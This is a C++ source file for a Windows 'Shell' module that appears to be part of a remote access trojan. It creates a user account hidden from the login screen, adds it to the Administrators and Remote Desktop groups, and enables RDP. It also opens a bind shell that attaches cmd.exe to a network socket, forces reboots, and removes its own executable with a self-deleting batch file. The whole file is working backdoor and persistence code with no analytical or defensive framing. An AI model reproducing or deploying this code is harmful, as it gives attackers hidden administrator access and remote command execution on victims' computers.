/*
 * Author: thirdstormofcythraul@outlook.com
 */
#include "cshell.h"

#include <cstdio>
#include <iostream>

#include "print.h"
#include "network.h"
#include "global.h"
#include "tcp.h"
#include "macro.h"
#include "info.h"
#include "crypted_global.h"
#include "register.h"
#include "tstring.h"

#include "memory_debug.h"

#define BUFFER_SIZE 1024

#pragma warning( disable : 4800 ) // stupid warning about bool

using namespace std;

bool Shell::executeCmd(const wchar_t *arguments, bool waitForTerminate, bool hideWindow){
	return Shell::execute(L"cmd.exe /C", arguments, waitForTerminate, hideWindow);
}

bool Shell::addRdpUser(const wchar_t *username, const wchar_t *password){
	std::wstring rdu = Info::getNameFromSid(L"S-1-5-32-555");
	MYPRINTF("RDU: %w\n", rdu.c_str());

	std::wstring admin = Info::getNameFromSid(L"S-1-5-32-544");
	MYPRINTF("ADMIN: %w\n", admin.c_str());

	wchar_t buffer[BUFFER_SIZE];
	swprintf_s(buffer, BUFFER_SIZE, TEXT("net user %s %s /add"), username, password);
	Shell::executeCmd(buffer, true, true);
	MYPRINTF("user added\n");
	
	Register reg;
	if (!reg.createDwordKey(HKEY_LOCAL_MACHINE, 
							TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList"),
							username,
							0)){
		return false;
	}

	if (!reg.createDwordKey(HKEY_LOCAL_MACHINE, 
						TEXT("System\\CurrentControlSet\\Control\\Terminal Server"),
						TEXT("fDenyTSConnections"),
						0)){
		return false;
	}

	if (!rdu.empty()){
		swprintf_s(buffer, BUFFER_SIZE,  TEXT("net localgroup \"%s\" \"%s\" /add"), rdu.c_str(), username);
		Shell::executeCmd(buffer, true, true);
	}

	if (!admin.empty()){
		swprintf_s(buffer, BUFFER_SIZE,  TEXT("net localgroup \"%s\" \"%s\" /add"), admin.c_str(), username);
		Shell::executeCmd(buffer, true, true);
	}

	swprintf_s(buffer, BUFFER_SIZE,  TEXT("sc start termservice"));
	Shell::executeCmd(buffer, true, true);
	return true;
}

void Shell::removeRdpUser(const wchar_t *username){
	wchar_t buffer[BUFFER_SIZE];
	
	swprintf_s(buffer, BUFFER_SIZE, TEXT("net user %s /delete"), username);
	Shell::executeCmd(buffer, true, true);
	MYPRINTF("user removed\n");

	// TODO: remove from UserList
}

std::wstring Shell::getCmdOutput(const wchar_t *arguments, bool hideWindow){
	wchar_t szCmdline[BUFFER_SIZE];
	swprintf_s(szCmdline, BUFFER_SIZE, TEXT("cmd.exe /C %s"), arguments);
	string res = Shell::getProcessOutput(szCmdline, hideWindow);
	return Shell::convertFromCurrentCodePage(res);
}

std::string Shell::getProcessOutput(const wchar_t *arguments, bool hideWindow){
	HANDLE g_hChildStd_OUT_Rd = 0;
	HANDLE g_hChildStd_OUT_Wr = 0;
	HANDLE g_hChildStd_ERR_Rd = 0;
	HANDLE g_hChildStd_ERR_Wr = 0;
	SECURITY_ATTRIBUTES sa; 
    // Set the bInheritHandle flag so pipe handles are inherited. 
    sa.nLength = sizeof(SECURITY_ATTRIBUTES); 
    sa.bInheritHandle = TRUE; 
    sa.lpSecurityDescriptor = 0; 
    // Create a pipe for the child process's STDERR. 
    if ( ! CreatePipe(&g_hChildStd_ERR_Rd, &g_hChildStd_ERR_Wr, &sa, 0) ) {
        return "";
    }
    // Ensure the read handle to the pipe for STDERR is not inherited.
    if ( ! SetHandleInformation(g_hChildStd_ERR_Rd, HANDLE_FLAG_INHERIT, 0) ){
        return "";
    }
    // Create a pipe for the child process's STDOUT. 
    if ( ! CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0) ) {
		return "";
    }
    // Ensure the read handle to the pipe for STDOUT is not inherited
    if ( ! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0) ){
		return "";
    }
    // Create the child process. 
    // Set the text I want to run
	wchar_t szCmdline[BUFFER_SIZE];
	swprintf_s(szCmdline, BUFFER_SIZE, TEXT("%s"), arguments);

    PROCESS_INFORMATION piProcInfo; 
    STARTUPINFO siStartInfo;
    bool bSuccess = FALSE; 

    // Set up members of the PROCESS_INFORMATION structure. 
    ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );

    // Set up members of the STARTUPINFO structure. 
    // This structure specifies the STDIN and STDOUT handles for redirection.
    ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
    siStartInfo.cb = sizeof(STARTUPINFO); 
    siStartInfo.hStdError = g_hChildStd_ERR_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
	if (!hideWindow){
		siStartInfo.lpDesktop = L"Winsta0\\default";
	} else {
		siStartInfo.dwFlags |= STARTF_USESHOWWINDOW;
		siStartInfo.wShowWindow = SW_HIDE;
	}

    // Create the child process. 
    bSuccess = CreateProcess(NULL, 
        szCmdline,     // command line 
        0,          // process security attributes 
        0,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        hideWindow ? (CREATE_NO_WINDOW|NORMAL_PRIORITY_CLASS) : NORMAL_PRIORITY_CLASS,             // creation flags 
        0,          // use parent's environment 
        0,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION

    CloseHandle(g_hChildStd_ERR_Wr);
    CloseHandle(g_hChildStd_OUT_Wr);
    // If an error occurs, exit the application. 
    if ( ! bSuccess ) {
        return "";
    }

    // Read from pipe that is the standard output for child process. 
    DWORD dwRead; 
    char chBuf[4096];

    std::string out = "", err = "";
    for (;;) { 
        bSuccess = ReadFile( g_hChildStd_OUT_Rd, chBuf, 4096, &dwRead, 0);
        if( ! bSuccess || dwRead == 0 ) break; 

        std::string s(chBuf, dwRead);
        out += s;
    } 
    dwRead = 0;
    for (;;) { 
        bSuccess = ReadFile( g_hChildStd_ERR_Rd, chBuf, 4096, &dwRead, 0);
        if( ! bSuccess || dwRead == 0 ) break; 

        std::string s(chBuf, dwRead);
        err += s;

    } 
	CloseHandle(g_hChildStd_OUT_Rd);
    CloseHandle(g_hChildStd_ERR_Rd);
    // The remaining open handles are cleaned up when this process terminates. 
    // To avoid resource leaks in a larger application, 
    //   close handles explicitly.
    return out; 
}

std::wstring Shell::convertFromCurrentCodePage(const std::string &message){
	UINT codePage = GetOEMCP();
	MYPRINTF("oemCP: %u\n", GetOEMCP());
	MYPRINTF("ACP: %u\n", GetACP());

	const char *ascii = message.c_str();
	LPWSTR wide = 0;
	int wideSize = 0;

	int result = MultiByteToWideChar(codePage, 0, ascii, -1, wide, wideSize);
	if (result == 0){
		return L"";
	}
	wideSize = result;
	wide = new WCHAR[result];
	result = MultiByteToWideChar(codePage, 0, ascii, -1, wide, wideSize);
	if (result == 0){
		return L"";
	}	

	return wide;
}

bool Shell::execute(const wchar_t *filename, const wchar_t *arguments, bool waitForTerminate, bool hideWindow){
	wchar_t buffer[BUFFER_SIZE];
	BOOL res;
	PROCESS_INFORMATION processInformation;
	STARTUPINFO startupInfo;
	LPTSTR szCmdline;

	swprintf_s(buffer, BUFFER_SIZE, TEXT("%s %s"), filename, arguments);

	szCmdline = _wcsdup(buffer);

	ZeroMemory( &startupInfo, sizeof(startupInfo) );
	startupInfo.cb = sizeof(STARTUPINFO);
	if (!hideWindow){
		startupInfo.lpDesktop = L"Winsta0\\default";
	} else {
		startupInfo.dwFlags = STARTF_USESHOWWINDOW;
		startupInfo.wShowWindow = SW_HIDE;
	}

	ZeroMemory( &processInformation, sizeof(processInformation) );

	res = CreateProcess(0, szCmdline, 0, 0, FALSE, hideWindow ? (CREATE_NO_WINDOW|NORMAL_PRIORITY_CLASS) : NORMAL_PRIORITY_CLASS, 0, 0, &startupInfo, &processInformation);
	if (res == 0){
		MYPRINTF("ERROR: CreateProcess failed!%d\n", GetLastError());
		return false;
	}
	if (waitForTerminate){
		WaitForSingleObject(processInformation.hProcess, 1000 * 60 * 5);
	}

	free(szCmdline);
	return true;
}

bool Shell::openShell(int port){
	SOCKET clientSocket;
	try {
		std::string publicIp = Global::get().getPublicIp();
		Tcp tcp(publicIp.c_str(), port);
		tcp.tcpbind();
		tcp.tcplisten();
		// Accept a client socket
		clientSocket = 0;
		while(clientSocket == 0){
			tcp.selectwrite();
			clientSocket = tcp.tcpaccept();
		}

		openShellOnSocket(clientSocket);

		closesocket(clientSocket);
	} catch (std::exception e){
		MYPRINTF("exception: %s\n", e.what());
	}
	return true;
}

void Shell::openShellOnSocket(SOCKET clientSocket){
	PROCESS_INFORMATION processInformation;
	// Options for process
	STARTUPINFO startupInfo;
	LPTSTR szCmdline = _wcsdup(L"cmd");

	ZeroMemory( &processInformation, sizeof(processInformation) );
	ZeroMemory( &startupInfo, sizeof(startupInfo) );
	startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	startupInfo.cb = sizeof(STARTUPINFO);
	// Attach the socket to the process
	startupInfo.hStdInput = (HANDLE) clientSocket;
	startupInfo.hStdError = (HANDLE) clientSocket;
	startupInfo.hStdOutput = (HANDLE) clientSocket;

	CreateProcess(0, szCmdline, 0, 0, TRUE, CREATE_NO_WINDOW | IDLE_PRIORITY_CLASS, 0, 0, &startupInfo, &processInformation);

	//WaitForSingleObject(processInformation.hProcess, INFINITE);

	free(szCmdline);
}

int Shell::openShellOnFtp(){
	return Shell::openShell(21);
}

bool Shell::reboot(){
	if (ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER) == 0) {
		MYPRINTF( "ExitWindowsEx failed with error: %d\n", GetLastError());
		return false;
	}
	return true;
}

int Shell::killAtNextReboot(){
	MoveFileEx(Info::getModulePath().c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
	return 0;
}

void Shell::deleteCurrent(){
	HANDLE hFile;
	DWORD  dwBytesWritten;
	wchar_t buffer[512];
	BOOL res;
	PROCESS_INFORMATION processInformation;
	STARTUPINFO startupInfo;
	LPTSTR szCmdline;
	wchar_t * batfile = L"dte.bat";

	const wchar_t *command = L"ping -n 20 127.0.0.1\r\ndel \"%s\"\r\ndel \"%s\"\r\nexit\r\n";
	swprintf_s(buffer, COUNTOF(buffer), command, Info::getModuleName().c_str(), batfile);

	hFile = CreateFile(batfile,
		FILE_WRITE_DATA,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	char *bufferAsChar = wToc(buffer);
	WriteFile(hFile, bufferAsChar, strlen(bufferAsChar), &dwBytesWritten, NULL);
	delete[] bufferAsChar;
	CloseHandle(hFile);

	szCmdline = _wcsdup(L"cmd.exe /C dte.bat");

	ZeroMemory( &startupInfo, sizeof(startupInfo) );
	startupInfo.cb = sizeof(STARTUPINFO);

	ZeroMemory( &processInformation, sizeof(processInformation) );

	res = CreateProcess(0, szCmdline, 0, 0, TRUE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, 0, 0, &startupInfo, &processInformation);
	if (res == 0){
		MYPRINTF("ERROR: CreateProcess failed! %d\n", GetLastError());
		return;
	}
}